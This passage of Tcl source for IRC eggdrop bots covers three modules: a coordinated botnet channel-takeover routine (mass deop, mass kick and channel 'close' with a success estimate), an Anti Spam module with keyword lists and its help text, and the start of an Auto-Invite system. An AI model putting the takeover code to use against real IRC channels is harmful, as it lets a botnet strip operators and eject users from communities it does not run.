    if {$s == "do" || $t == "do"} {
	if {$w == "close"} { set m "Closing channel" } else { set m "Coordinated mass $w on" }
	bl "$m [b]$c[b] : requested by $h."
    }
    set cmx_b($i) ""
    if {$T != 0} {
	if {[expr $T] > 30} { set T 30 }
	putallbots "cmx_get $c $i"
	pb $i "Gathering opped bots, timeout is [b]$T[b] sec : be patient.."
	utimer $T "cmx_do [p_test $h] $i $c $w $T $s"
    } else {
	cmx_do $h $i $c $w $T $s
    }
}
proc bot:cmx_get {b cm a} {
    set c [bi $a 0] ; set i [bi $a 1]
    if {[validchan $c] && [botonchan $c] && [botisop $c]} { putbot $b "cmx_put $c $i" }
}
proc bot:cmx_put {b cm a} {
    global cmx_b ; set c [bi $a 0] ; set i [bi $a 1]
    if {![info exists cmx_b($i)] || [lsearch -exact $cmx_b($i) $b] == -1} { append cmx_b($i) "$b " }
}
proc cmx_stat {r l k} {
    set m [expr $l * $k]
    set o [expr $r + [expr int([expr $r.00 / 2])]]
    if {$o == 0} { return 100 }
    set r [expr $m.000 / $o]
    if {$r < 0.5} { set f 1.3 } else { set f 1.245 }
    set r [expr pow ([expr $r * $f], 2)]
    if {$r <= 0.01 } { set r 0.01 }
    if {$r > 0.99} { set r 0.99 }
    return [expr int([expr $r * 100])]
}
proc cmx_do {h i c w t {s ""}} {
    global cmx_b bnick modes-per-line
    if {![info exists cmx_b($i)]} { set cmx_b($i) "" }
    set b $cmx_b($i) ; unset cmx_b($i)
    if {![valididx $i] && ($i != $c)} { return 0 }
    lappend b $bnick
    set l [llength $b]
    set r ""
    foreach n [chanlist $c] {
	set v [nick2hand $n $c]
	if {[isop $n $c] && ![isbotnick $n] && ![matchattr $v b] && ![matchattr $v o|o $c]} { lappend r $n }
    }
    if {[info exists modes-per-line] && ${modes-per-line} != 0} { set k ${modes-per-line} } else { set k 3 }
    set q [cmx_stat [llength $r] $l $k]
    set m "Operation success estimated at [b]$q[b]% ( [llength $r] oped targets, $l bots ) : "
    if {$q >= 90} {
	append m "ready to take it !"
    } elseif {$q >= 80} {
	append m "I know we can do it !"
    } elseif {$q >= 70} {
	append m "good luck Sir !"
    } elseif {$q >= 60} {
	append m "uhm.. I 'm not sure we can do it.."
    } elseif {$q >= 40} {
	append m "high risk, I need more bots.."
    } elseif {$q >= 20} {
	append m "I think we 'll obtain nothing.."
    } else {
	append m "sorry, we 'll lose op for nothing!"
    }
    pb $i $m
    if {$q < 20} { if {$s == "do"} { pb $i "Operation cancelled." } ; return 0 }
    if {$s != "do"} {
	if {$w == "close"} { set W $w } else { set W m$w }
	pb $i "If you are sure, use '.$W $c $t [b]do[b]' to proceed now !" ; return 0
    }
    pb $i "[b]Ready![b] Starting coordinated takeover on $c with [b]$l[b] bots : $b"
    set o ""
    while {$r != ""} { set j [rand [llength $r]] ; lappend o [lindex $r $j] ; set r [lreplace $r $j $j] }
    if {$w == "close"} {
	foreach n [chanlist $c] {
	    set v [nick2hand $n $c]
	    if {![isbotnick $n] && ![matchattr $v b] && ![matchattr $v o|o $c] && [lsearch -exact $o $n] == -1} { lappend o $n }
	}
    }
    if {$w == "close"} { set w "kick" }
    putquick "MODE $c +stinm"
    set j 0
    while {[llength $o] > 0} {
	if {$j >= $l} { set j 0 }
	set n [lrange $o 0 [expr $k - 1]] ; set o [lrange $o $k end]
	pb $i "[b]$w[b] - [lindex $b $j] ---> $n"
	if {[lindex $b $j] == $bnick} {
	    switch $w {
		"deop" {
		    foreach q $n { pushmode $c -o $q }
		}
		default {
		    regsub -all " " $n "," n
		    putkick $c $n "[boja] - See you next time! ;o)"
		}
	    }
	    flushmode $c
	} else {
	    putbot [lindex $b $j] "cmx_take $h $c $w $n"
	}
	incr j
    }
}
proc bot:cmx_take {b cm a} {
    set h [bi $a 0] ; set c [bi $a 1] ; set w [bi $a 2] ; set n [lrange $a 3 6]
    if {![matchattr $h m|m $c]} { bl "Denied takeover request from $h for $c on $b : not master!" ; return 0 }
    if {![botonchan $c] || ![botisop $c]} {
	bl "Cannot commence takeover, bouncing command back to $b.."
	putbot $b "cmx_take $h $c $w $n" ; return 0
    }
    bl "Coordinated takeover on $c : requested by $h ( from $b ) : I 'll $w [b]$n[b]"
    switch $w {
	"deop" { foreach q $n { pushmode $c -o $q } }
	default { regsub -all " " $n "," n ; putkick $c $n "[boja] - See you next time! ;o)" }
    }
    flushmode $c
}
al init "Takeover, Mass Deop/Kick, Close System loaded and ready!"
set take_module_loaded 1
}
set smart_spam {set m "spam"
global bnick wpref ${m}_module_name ${m}_module_init ${m}_module_bind ${m}_module_loaded ${m}_noconf_commands
global ${m}_pubkeys ${m}_privkeys ${m}_pubkeys_default ${m}_privkeys_default ${m}_cykeys ${m}_cykeys_default ${m}_rehashing

set spam_rehashing 1

set ${m}_module_name "Anti Spam"
set ${m}_module_bind "m|m"
set ${m}_help_list "{dcc $m m|m} {dcc m${m} m|m}"

set ${m}_module_init {
	{ver 1 "2.1" "Version"}
	{author 1 "^Boja^ <boja@avatarcorp.org>" "Author"}
	{log 0 "off" "Verbose Logging" "%k:on off"}
	{monitor(all) 0 "off" "Monitoring Kind" "%k:off priv pub any"}
	{cycle(all) 0 "normal" "Channel Cycling" "%k:off normal"}
	{ctime 0 "6" "Cycling Time" "%d:1 300"}
	{crep 0 "45" "Cycle Repeat Every" "%d:15 300"}
	{cyfile 0 "default" "Cycle Message File" "%l:default" n}
	{bantime 0 "60" "Ban Time" "%d:15 600"}
	{timeout 0 "90" "Spammer Timeout" "%d:30 600"}
	{first 0 "notice" "First Punishment" "%k:notice kick ban"}
	{fmex 0 "We don 't like spam: please, stop it!" "First Warning Mex"}
	{pmex 0 "Go spam elsewhere: we hate spammers!" "Punishment Mex"}
	{pubfile 0 "default" "Public Keys File" "%l:default" n}
	{privfile 0 "default" "Private Keys File" "%l:default" n}
}
# format: {command single-only-interface_flag no-logs_flag}
set ${m}_noconf_commands {
	docycle pubkeys privkeys cykeys +pubkey -pubkey +privkey -privkey +cykey -cykey
}

module_init $m ; eval [module_globals $m] ; # Module initialization

# This script determines 'what' are your module-vars.
# Ex: on $m_module_init: {timeout(all) 0 10 "Ban Timeout" "%d:1 120"} ->you want this value to be 'minutes'
# h=handle, m=module_name, v=var_name(timeout), a=array_arg(all), n=param_num(0), w=calling_proc
# w: calling_proc: status=invoked by '.mod (-v)', parse=bye '.mod timeout value', info=by '.mod timeout'.
# If in all cases you want to be displayed 'minutes', just change '$r' value, or you can select your case..
proc ${m}_what_script {h m v a n w} {
	eval [module_globals $m] ; set r ""
	switch -exact -- $v {
		"ctime" { set r seconds }
		"crep" {
			set T 0; foreach t [timers] { if {[lindex $t 1]=="spam:cycle"} { set T [lindex $t 0]; break } }
			set r "minutes" ; if {$T != 0 && [spam:mon priv] != ""} { append r " (next in $T minutes)" }
		}
		"bantime" - "timeout" { set r "minutes" }
		default {}
	}
	return $r
}

proc $m:log {t} { global spam_log ; if {$spam_log == "off"} { return 0 } ; al spam $t }
proc $m:timeout {u} {
	global spam_u ; if {[info exists spam_u($u)]} { unset spam_u($u) }
	foreach t [timers] { if {[lindex $t 1] == "spam:timeout $u"} { killtimer [lindex $t 2] } }
}

proc $m:punish {n uh h c} {
	set m spam ; eval [module_globals $m] ; global bnick ${m}_u ; set u [bi $uh@$c 0]
	if {[info exists spam_u($u)]} {
		if {$spam_u($u) == "notice"} { set spam_u($u) kick } else { set spam_u($u) ban } ; set r $spam_pmex
	} else { set spam_u($u) $spam_first ; set r $spam_fmex }
	set q "spammer $n!$uh " ; if {$h != "*" && $h != ""} { append q "( $h ) " } ; set w $spam_u($u)
	switch -exact $w {
		notice { putnotc $n $r ; set q "Noticed $q" ; if {[validchan $c]} { append q " for channel $c" } }
		default {
			if {$w == "kick"} { set Q "Kicked" } else { set Q "Banned" ; set B [wmh $uh ban] }
			if {[validchan $c]} {
				set b [smartbot 1 $c]
				if {[onchan [hand2nick $b $c]]} {
					putbot $b "sop:req kick $c $n do $r" ; if {$w == "ban"} { putbot $b "sop:req ban $c $n $B,AntiSpam,$spam_bantime $r" }
					set q "$Q $q from channel $c via $b"
				} elseif {[botisop $c]} {
					sop:req $bnick 0 "kick $c $n do $r"
					if {$w == "ban"} { sop:req $bnick 0 "ban $c $n $B,AntiSpam,$spam_bantime $r" }
					set q "$Q $q from channel $c"
				} else { set q "Could not $w $q from $c : I need op.." }
			} else {
				set o 0
				foreach C [channels] {
					set b [smartbot 1 $c]
					if {[onchan [hand2nick $b $C]]} {
						putbot $b "sop:req kick $C $n do $r" ; set o 1
						if {$w == "ban"} { putbot $b "sop:req ban $C $n $B,AntiSpam,$spam_bantime $r" }
					} elseif {[botisop $C] && [onchan $n $C]} {
						sop:req $bnick 0 "kick $C $n do $r" ; set o 1
						if {$w == "ban"} { sop:req $bnick 0 "ban $C $n $B,AntiSpam,$spam_bantime $r" }
					}
				}
				if {$o} { set q "$Q $q from all channels" } else { set q "Problems in $w $q from all bot channels" }
			}
		}
	}
	if {$q != ""} { spam:log $q }
	foreach t [timers] { if {[lindex $t 1] == "spam:timeout $u"} { killtimer [lindex $t 2]} }
	timer $spam_timeout "spam:timeout $u"
}
# nick userhost handle kind channel text
proc $m:check {n uh h k c t} {
	if {[flagged $h f f]} { return 0 } ; global spam_pubkeys spam_privkeys
	if {[validchan $c]} { set words $spam_pubkeys } else { set words $spam_privkeys } ; set o 0
	switch -exact -- $k {
		ctcp - msgm - pubm - notc {
			if {$k == "ctcp" && [stru [bi $t 0]] == "DCC" && [string match "*SEND*" [stru [bi $t 1]]]} {
				set o 1
			} else {
				foreach w $words { if {[string match "*[strl $w]*" [strl $t]]} { set o 1 ; break } }
			}
		}
		inv { if {![validchan $t]} { set o 1 } }
		default { al spam "Warning! Invalid spam:check kind given:[c e][b] $w[b][c]" }
	}
	if {$o} { spam:punish $n $uh $h $c }
}
proc $m:mon {k} {
	global spam_monitor
	switch -exact -- $k {
		"all" { set w "priv pub any" }
		"priv" - "pub" { set w "any $k" }
		default { set w $k }
	}
	if {[lsearch -exact $w $spam_monitor(all)] != -1} { set c [strl [channels]] } else { set c "" }
	foreach n [array names spam_monitor] {
		if {$n == "all"} { continue }
		if {[lsearch -exact $w $spam_monitor($n)] != -1} {
			if {[lsearch -exact $c $n] == -1} { lappend c $n }
		} else {
			set q [lsearch -exact $c $n] ; if {$q != -1} { set c [lreplace $c $q $q] }
		}
	}
	return $c
}
set ${m}_cykeys_default {
	"Broken pipe" "Leaving" "Bye Bye to all!" "I have no reason" "I need a shower" "Looking for my dildo"
	"Watching a porn" "I 'm loosing my blinda.. :o(" "Oh shit, I can't find my antani!!"
	"Hey, where is my bamboble?!" "Wanna see my fenula? :)" "Foffo is more than sex!!!"
	"Kiss my ass!" "I don't want love, I need it.." "See you later!!" "Burn Baby Burn" "Tomorrow never die"
	"See you next time! :)" "Bye bye friends!" "Will you miss me ? :)" "I did nothink! :o?"
	"Where I am going? I don't really know.." "Sorry all, sorry.." "I need the toilet !!! >:-|"
	"Pwho !!! >:-o" "I 'll come again, don 't worry! :)" "I can 't understand 'tarapia-tapioca',sorry.. :("
	"Never fight with me.." "Will you remember my ass or my brain? :)" "I must play with myself now ^_^"
	"Just another shadow in the night.." "Game Over!!!" "Pizza time!!! :D" "Sleeping time.."
	"Where the hell is my banana??" "Have you never seen a giant Biscamburri?!" "Besbo.."
	"Verus Amicus est tamquam Alter Idem" "In omnia pericula tasta testicula"
	"Testicula tacta omnia mala fugent"
}

set ${m}_pubkeys_default { {my fserv} {visit } {goto } {come to } {tutti su } {tutti in } {venite su } {venite in } {entrate in } {mio sito } {cerco ragazz} {/join #} }

set ${m}_privkeys_default { http:// www. {my fserv} {visit } {goto } {come to} {tutti su} {tutti in} {venite su} {venite in} {entrate in} {mio sito} {cerco ragazz} looking cerchi money soldi affare {non perdere} {ragazze} sex porn xxx check prova try script nude sms guadagna {join #} }

proc $m:loadkeys {w} {
	set m spam; set k ${m}_${w}keys; set f ${m}_${w}file; global $k $f; set fn [expr $$f]
	if {$fn == "default"} { global wpref; set fn $wpref.$k }
	set fd [file_try $fn r]
	if {$fd == 0} {
		set q "Message File [b]$fn[b] [c e]does not exist[c]!"
		if {[expr $$f] == "default"} {
			append q " Generating"; set kd ${k}_default; global $kd
			set fd [file_try $fn w]
			if {$fd == 0} { al "[warn] Could not create file $fn.."; return 0 }
			foreach l [expr $$kd] { puts $fd $l }; close $fd
		} else { set q "[warn] $q Reverting to" }
		al spam "$q [c o]defaults[c].."
		set $f "default"; module_save $m; $m:loadkeys $w; return 0
	}
	set $k ""; while {![eof $fd]} { set s [gets $fd]; if {[eof $fd]} { break }; lappend $k $s } ; close $fd
	if {[llength [expr $$k]] < 1} {
		al spam "[warn] [c e]No Messages[c] found in file [b]$fn[b]! Reverting to [c o]defaults[c].."
		set $f "default"; module_save $m; $m:loadkeys $w; return 0
	}
}
foreach k "pub priv cy" { $m:loadkeys $k }
unset ${m}_cykeys_default ${m}_pubkeys_default ${m}_privkeys_default

### DA QUI: modalità smart (distribuita)
proc $m:cycle {} {
	global spam_cycle spam_crep spam_ctime spam_cykeys spam_rehashing; set ch [spam:mon priv]
	if {([info exists spam_rehashing] && ![string match "*spam:cycle*" [timers]]) || ![info exists spam_rehashing]} {
		foreach t [timers] { if {[string match "*spam:cycle*" [lindex $t 1]]} { killtimer [lindex $t 2] } }
		timer [expr $spam_crep + [rand 10]] spam:cycle
	}
	if [info exists spam_rehashing] { unset spam_rehashing; return 0 } ; if {$ch == ""} { return 0 }
	foreach C $ch {
		if {[info exists spam_cycle($C)]} { set c $C } else { set c "all" }
		set m "[lindex $spam_cykeys [rand [llength $spam_cykeys]]]"
		switch -exact -- $spam_cycle($c) {
			"smart" {
				### DA QUI
				al spam "Sorry, smart mode not yet implemented.. <:-D"
			}
			default { sop:cycle $C $spam_ctime 0 $m }
		}
	}
}
proc $m:msgm {n uh h t} { global bnick ; spam:check $n $uh $h msgm $bnick $t }
proc $m:pubm {n uh h c t} { spam:check $n $uh $h pubm $c $t }
proc $m:notc {n uh h t {d ""}} { spam:check $n $uh $h notc $d $t }
proc $m:ctcp {n uh h d k t} { spam:check $n $uh $h ctcp $d "$k $t" }
proc $m:inv {f k a} {
	set f [split $f !] ; set n [lindex $f 0] ; set uh [lindex $f 1]
	spam:check $n $uh [nick2hand $n] inv [bi $a 0] [string range [br $a 1 end] 1 end]
}
proc $m:turn {t a} {
	foreach w $a {
		set b "spam:"; if {$w != "inv"} { set W $w; set m * } else { set W raw; set m INVITE } ; append b $w
		switch -exact -- $t {
			"on" { if {[binds $b] == ""} { catch { bind $W - $m $b } } }
			"off" { if {[binds $b] != ""} { catch { unbind $W - $m $b } } }
			default { al spam "[c e]Invalid mode[c] given to 'spam:turn':[c e][b] $t[b][c]" }
		}
	}
}
proc spam:enable {} {
	global spam_u
	if {[spam:mon pub] != ""} { set p 1 } else { set p 0 }
	if {[spam:mon priv] != ""} { set P 1 } else { set P 0 }
	if {$p && $P} {
		set on "msgm notc ctcp inv pubm" ; set off ""
	} elseif {$p && !$P} {
		set on "pubm notc" ; set off "msgm ctcp inv"
	} elseif {!$p && $P} {
		set on "msgm notc ctcp inv" ; set off "pubm"
	} else {
		set on "" ; set off "msgm notc ctcp inv pubm" ; foreach u [array names spam_u] { spam:timeout $u }
	}
	if {$on != ""} { spam:turn on $on } ; if {$off != ""} { spam:turn off $off } ; spam:cycle
}
utimer 3 spam:enable



# Module Setup Procedure, to set values for parameters, call your procs/scripts, save config, log, etc..
# h = handle, i = idx (=0 when proc is executed on remote bots), m = module_name, l = 1:local bot, 0:remote
# G = list of target bots for bot sending command (and sender bot when proc is executed on remote bots)
# g = symbolic target bots indication (like 'ALL connected bots' or 'W bots', or 'bot1'..); y = if l==1 and
# I have to execute command then y=1; w = command_name, p = parameter(s).
# Uncomment '#al testing..' and make some test to see what's happening!
proc ${m}_module_setup {h i m l G g w p} {
	global bnick; set a [module_array_vars $m] ; set y [local:for:me $G] ; eval [module_globals $m]
	#al "testing ${m}_module_setup" "h=$h, i=$i, m=$m, l=$l, G=$G, g=$g, y=$y, w=$w, p=$p, array_vars=$a"
	switch -exact -- $w {
		"docycle" {
			$m:cycle; set r "Forced spam cycling"; module:report $m $l $y $G $h $i $r
		}
		"pubkeys" - "privkeys" - "cykeys" {
			set q ${m}_${w} ; global $q; set r "" ; foreach q [expr $$q] { append r "\\\"$q\\\"," }
			set r [string range $r 0 [expr [string length $r] -2]]; append r "."; module:report $m $l $y $G $h $i $r
		}
		"+pubkey" - "-pubkey" - "+privkey" - "-privkey" - "+cykey" - "-cykey" {
			regsub -all \" $p "" P; regsub -all \{ $P "" P; regsub -all \} $P "" P
			if {$P == ""} { set r "Usage: .$m $w \\\"key phrase\\\" ([c n]Note: doublequotes are mandatory![c])"; module:report $m $l $y $G $h $i $r; return 0 }
			set A [string index $w 0]; set W [string range [lindex [split $w k] 0] 1 end]
			set k ${m}_${W}keys; set f ${m}_${W}file; global $k $f; set fn [expr $$f]
			if {$fn == "default"} { global wpref; set fn $wpref.$k }
			if {[string index $p 0] == "\{"} { set p [string range $p 1 end] }
			if {[string index $p [expr [string length $p] - 1]] == "\}"} { set p [string range $p 0 [expr [string length $p] - 2]] }
			if {[string index $p 0] != "\"" || [string index $p [expr [string length $p] - 1]] != "\""} {
				set r "Please, include your keys between doublequotes, like: \\\"key \\\". I got: --->${p}<---"
				if {$l} {
					if {$y} { bot:module_interface $bnick 0 "$h $i module_status_report $r" }
				}
				# else { putbot $G "$m $h $i module_status_report $r" }
				if {[string index $p 0] != "\""} { set p "\"$p" }
				if {[string index $p [expr [string length $p] - 1]] != "\""} { append p "\"" }
			}
			set p [string range $p [expr [string first \" $p] + 1] [expr [string last \" $p] - 1]]; set r ""
			#dccputchan 0 "A = $A, W = $W, f = $f, k = $k, fn = $fn, p = --${p}--"
			if {$A == "+"} {
				if {[lsearch -exact [expr $$k] $p] != -1} {
					set r "The key \\\"$p\\\" is already present in list! ;)"
				} else {
					set fd [file_try $fn a]
					if {$fd == 0} {
						set r "Could not write on file $fn.."
					} else {
						puts $fd $p; close $fd; $m:loadkeys $W
						set r "Successfully stored new keyword \\\"$p\\\""
					}
				}
			} else {
				set n [lsearch -exact [expr $$k] $p]
				if {$n == -1} {
					set r "Key \\\"$p\\\" not found in list! ;)"
				} else {
					set $k [lreplace [expr $$k] $n $n]; set fd [file_try $fn w]
					foreach line [expr $$k] { puts $fd $line }; close $fd; $m:loadkeys $W
					set r "Successfully removed keyword \\\"$p\\\""
				}
			}
			module:report $m $l $y $G $h $i $r
		}
		default {
			module_save_changes $h $i $m $l $G $g $w $p $a
			if {$w == "monitor"} { spam:enable } ; if {$w == "cycle"} { spam:cycle }
			if {[lsearch -exact "privfile pubfile cyfile" $w] != -1} { $m:loadkeys [lindex [split $w f] 0] }
		}
	}
}

al init "[module_name $m] (version [expr $${m}_ver]) loaded and ready!"; set ${m}_module_loaded 1; unset m
}
set smart_spam_help {%{help=spam}%{+m|+m}
###  %b.spam%b
   Standard Interface to Anti Spam Module.
   Displays module status and saved settings.
###  %b.spam -v%b
   Displays module status, complete command list and quick-help.
###  %b.spam ver%b
   Displays Anti Spam Module version.
###  %b.spam author%b
   Displays informations about Module Author.
###  %b.spam clear%b
   Removes Anti Spam configuration file.
See also: '.help clear'
###  %b.spam log%b [on / off]
   Enables or disables verbose logging. Default is on.
###  %b.spam monitor%b <all / #channel> [all / off / priv / pub / any]
   Sets monitoring kind for all channels or for a specific channel.
   Possible choices for monitoring kind include:
   'off': disables spam monitoring;
   'all': use the settings for 'all' channels;
   'priv': only private spam is monitored (notice/query messages, dcc-
           file sends, etc.);
   'pub': only public (channel) spam is monitored;
   'any': both private and public spam are monitored.
###  %b.spam cycle%b <all / #channel> [all / off / normal / smart]
   Enables or disables channel cycling for all channels or for a
   specific channel. This means that the bot will periodically
   perform channel cycling to detect onjoin (and onpart) spammers.
   Default is 'normal'. Possible options include:
   'off': disables channel cycling;
   'all': use the settings for 'all' channels;
   'normal': cycles channels using the current bot (the bot on which
             Anti Spam is enabled);
   'smart': makes random remote bots perform channel cycling, making
            it impossible to determine the monitoring bot; this is
            usefull against scripts logging kickers. Requires Anti
            Spam Module loaded on ALL bots.
            Note: NOT YET AVAILABLE!
###  %b.spam ctime%b [seconds#]
   Sets the amount of seconds the bot will stay out of a channel while
   performing a cycle to find onjoin/onpart spammers.
   Valid range is: 1 to 300 seconds. Default is 6.
###  %b.spam crep%b [minutes#]
   Sets the amount of minutes between channel cycles.
   Valid range is: 15 to 300 minutes. Default is 45.
###  %b.spam cyfile [filename / default]
   Lets you choose a text file containing part messages to use while
   performing channel cycling routines (see '.spam cycle'). The text
   file is very easy to manage: one message for each line.
   Default cycle message file is: smartTCL/smart.BOTNAME.spam_cykeys.
See also: .spam cykeys, .spam +cykey, .spam -cykey, .spam clear
###  %b.spam cykeys%b
   Shows all cycling (part) messages.
See also: .spam +cykey, .spam -cykey
###  %b.spam +cykey%b "part message"
   Adds the specified message to cyfile.
   Note: the message *MUST* be written between doublequotes.
See also: .spam -cykey, .spam cykeys
###  %b.spam -cykey%b "part message"
   Removes the specified message from cyfile.
   Note: the message *MUST* be written between doublequotes.
See also: .spam +cykey, .spam cykeys
###  %b.spam docycle%b
   Forces a channel cycling to detect private spammers.
###  %b.spam bantime%b [minutes#]
   Sets default bantime for spammers. Valid range is: 15 to 600
   minutes. Default is 60 (1 hour).
See also: .spam first, .spam fmex, .spam pmex, .spam timeout
###  %b.spam timeout%b [minutes#]
   Sets the amount of minutes a spammer has to be quiet to reset
   his spam record. After that time, he will be considered a
   normal user, so if he spam again it will be considered his
   first spam. Valid range is: 30 to 600 minutes. Default is 90.
See also: .spam first, .spam fmex, .spam pmex, .spam bantime
###  %b.spam first%b [notice / kick / ban]
   Sets the punishment for users which spam for the first time.
   Default is 'notice'.
See also: .spam fmex
###  %b.spam fmex%b [first-warning-message]
   Sets the warning message for users which spam for the first time.
   Usually this should be only a polite warning message.
See also: .spam first
###  %b.spam pmex%b [punish-message]
   Sets the default message used to kick (or kickban) spammers.
See also: .spam first, .spam fmex
###  %b.spam pubfile%b [filename / default]
   Lets you choose a text file containing public keys and phrases
   used to detect a public spammer (that phrases will be checked
   in channels).The text file is very easy to manage: one message
   for each line. Default public keyphrase file is: smartTCL/smart.BOTNAME.spam_pubkeys.
See also: .spam pubkeys, .spam +pubkey, .spam -pubkey, .spam clear
###  %b.spam pubkeys%b
   Shows all public keyphrases.
See also: .spam +pubkey, .spam -pubkey
###  %b.spam +pubkey%b "public spam keyphrase"
   Adds the specified keyphrase to public spam keyphrase file.
   Note: the keyphrase *MUST* be written between doublequotes.
See also: .spam -pubkey, .spam pubkeys
###  %b.spam -pubkey%b "public spam keyphrase"
   Removes the specified keyphrase from public spam keyphrase file.
   Note: the keyphrase *MUST* be written between doublequotes.
See also: .spam +pubkey, .spam pubkeys
###  %b.spam privfile%b [filename / default]
   Lets you choose a text file containing private keys and phrases
   used to detect a private spammer (that phrases will be checked
   in query messages, dcc's, etc).The text file is very easy to
   manage: one message for each line. Default public keyphrase file
   is: smartTCL/smart.BOTNAME.spam_privkeys.
See also: .spam privkeys, .spam +privkey, .spam -privkey, .spam clear
###  %b.spam privkeys%b
   Shows all private keyphrases.
See also: .spam +privkey, .spam -privkey
###  %b.spam +privkey%b "private spam keyphrase"
   Adds the specified keyphrase to private spam keyphrase file.
   Note: the keyphrase *MUST* be written between doublequotes.
See also: .spam -privkey, .spam privkeys
###  %b.spam -privkey%b "private spam keyphrase"
   Removes the specified keyphrase from private spam keyphrase file.
   Note: the keyphrase *MUST* be written between doublequotes.
See also: .spam +privkey, .spam privkeys
%{help=mspam}%{+m|+m}
###  %b.mspam%b ...
   Standard Mass interface for Anti Spam Module.
See also: '.help mass'
}
set smart_ainv {# Auto Invite System

global wpref ainv_module_loaded ainv_module_conf ainv_ver ainv_ch ainv_flag ainv_boring ainv_log

bind dcc n ainv dcc:ainv
bind join - * ainv:join

set ainv_module_conf "$wpref.ainv"
set ainv_ver ""
set ainv_ver1 "1.0"
set ainv_ch(all) "none"
set ainv_flag(all) "-"
set ainv_boring(all) "off"
set ainv_log(all) "off"
proc ainv_save {} {
    global ainv_module_conf ainv_ver ainv_ch ainv_flag ainv_boring ainv_log
    set fd [file_try $ainv_module_conf w]
    puts $fd "set ainv_ver \"$ainv_ver\""
    foreach c [array names ainv_ch] {
	if {$c == "all" || ([validchan $c] && ($ainv_ch($c) != $ainv_ch(all)))} {
	    puts $fd "set ainv_ch($c) \"$ainv_ch($c)\""
	}
    }
    foreach c [array names ainv_flag] {
	if {$c == "all" || ([validchan $c] && ($ainv_flag($c) != $ainv_flag(all)) && ([info exists ainv_ch($c)] && $ainv_ch($c) != $ainv_ch(all)))} {
	    puts $fd "set ainv_flag($c) \"$ainv_flag($c)\""
	}
    }
    foreach c [array names ainv_boring] {
	if {$c == "all" || ([validchan $c] && ($ainv_boring($c) != $ainv_boring(all)) && ([info exists ainv_ch($c)] && $ainv_ch($c) != $ainv_ch(all)))} {
	    puts $fd "set ainv_boring($c) \"$ainv_boring($c)\""
	}
    }
    foreach c [array names ainv_log] {
	if {$c == "all" || ([validchan $c] && ($ainv_log($c) != $ainv_log(all)) && ([info exists ainv_ch($c)] && $ainv_ch($c) != $ainv_ch(all)))} {
	    puts $fd "set ainv_log($c) \"$ainv_log($c)\""
	}
    }
    close $fd
    foreach c [array names ainv_ch] { unset ainv_ch($c) }
    foreach c [array names ainv_flag] { unset ainv_flag($c) }
    foreach c [array names ainv_boring] { unset ainv_boring($c) }
    foreach c [array names ainv_log] { unset ainv_log($c) }
    source $ainv_module_conf
}
if {![file exists $ainv_module_conf]} {
    al init "Auto-Invite conf file not found. Generating defaults.." ; ainv_save
}
source $ainv_module_conf
if {$ainv_ver1 != $ainv_ver} { set ainv_ver $ainv_ver1 ; ainv_save }
unset ainv_ver1
proc ainv:log {c n t} {
    global ainv_log
    if {([info exists ainv_log($c)] && $ainv_log($c) != "off") || (![info exists ainv_log($c)] && $ainv_log(all) == "on")} {
	bl "Invited $n from $c to $t"
    }
}
proc ainv:join {n uh h c} {
    global ainv_ch ainv_flag
    set c [strl $c]
    if {[lsearch -regexp [array names ainv_ch] $c] != -1} { set w $c } else { set w "all" }
    if {$ainv_ch($w) == "none"} { return 0 }
    if {[info exists ainv_flag($c)]} { set f $ainv_flag($c) } else { set f $ainv_flag(all) }
    if {[flagged $h $f $c]} {
	foreach t [br $ainv_ch($c) 0 end] {
	    if {[validchan $t] && [botonchan $t] && [botisop $t] && ![onchan $n $t]} {
		putquick "INVITE $n $t" ; ainv:log $c $n $t
	    }
	}
    }
}
proc ainv:check {} {
    global ainv_ch ainv_flag ainv_boring
    set ok 0 ; foreach c [array names ainv_boring] { if {$ainv_boring($c) != "no"} { set ok 1 } }
    if {!$ok} {
	if {![string match *ainv:check* [timers]]} { timer [expr 8 + [rand 5]] "ainv:check" }
	return 0
    }
    foreach c [array names ainv_ch] {
	if {$c != "all" && $ainv_ch($c) != "none"} {
	    if {([info exists ainv_boring($c)] && $ainv_boring($c) == "on") || (![info exists ainv_boring($c)] && $ainv_boring(all) == "on")} {
		if {[validchan $c] && [botonchan $c] && [botisop $c]} {
		    if {[info exists ainv_flag($c)]} { set f $ainv_flag($c) } else { set f $ainv_flag(all) }
		    foreach n [chanlist $c -b] {
			if {[flagged [nick2hand $n $c] $f $c]} {
			    foreach t $ainv_ch($c) {
				if {[validchan $t] && [botonchan $t] && [botisop $t] && ![onchan $n $t]} {
				    putquick "INVITE $n $t" ; ainv:log $c $n $t
				}
			    }
			}
		    }
		}
	    }
	}
    }
    if {$ainv_ch(all) != "none"} {
	foreach c [strl [channels]] {
	    if {([info exists ainv_boring($c)] && $ainv_boring($c) == "on") || (![info exists ainv_boring($c)] && $ainv_boring(all) == "on")} {
		if {[botonchan $c] && [botisop $c]} {
		    if {[info exists ainv_flag($c)]} { set f $ainv_flag($c) } else { set f $ainv_flag(all) }
		    foreach n [chanlist $c -b] {
			if {[flagged [nick2hand $n $c] $f $c]} {
			    foreach t $ainv_ch($c) { putquick "INVITE $n $t" ; ainv:log $c $n $t }
			}
		    }
		}
	    }
	}
    }
    if {![string match *ainv:check* [timers]]} { timer [expr 8 + [rand 5]] "ainv:check" }
}
if {![string match *ainv:check* [timers]]} { timer [expr 8 + [rand 5]] "ainv:check" }
proc dcc:ainv {h i a} {
    global ainv_ver ainv_ch ainv_flag ainv_boring ainv_log
    set f [strl [bi $a 0]] ; set t [strl [br $a 1 end]]
    if {$f == ""} {
	putcmdlog "\#$h\# ainv"
	pb $i "[b]Auto-Invite[b] System Status -"
	pb $i "---------------------------------"
	pb $i "System Version \t: [b]$ainv_ver[b]"
	foreach c [array names ainv_ch] {
	    set q "Active Channel \t: [b]$c[b] --> [b][br $ainv_ch($c) 0 end][b] (flags:[b]"
	    if {[info exists ainv_flag($c)]} {
		append q $ainv_flag($c)
	    } else { append q $ainv_flag(all) }
	    append q "[b], boring:[b]"
	    if {[info exists ainv_boring($c)]} {
		append q $ainv_boring($c)
	    } else { append q $ainv_boring(all) }
	    append q "[b], log:[b]"
	    if {[info exists ainv_log($c)]} {
		append q $ainv_log($c)
	    } else { append q $ainv_log(all) }
	    append q "[b])" ; pb $i $q
	}
	pb $i "----------------------------------"
	return 0
    }
    switch -exact -- $f {
	"ver" {
	    putcmdlog "\#$h\# ainv ver"
	    pb $i "[b]Auto-Invite[b] System version [b]$ainv_ver[b]"
	}
	"flag" {
	    set c [strl [bi $a 1]] ; set w [bi $a 2]
	    if {$c == ""} {
		pb $i "Usage: .ainv flag <\#channel> \[- / <+/->flag]" ; return 0
	    }
	    if {$w == ""} {
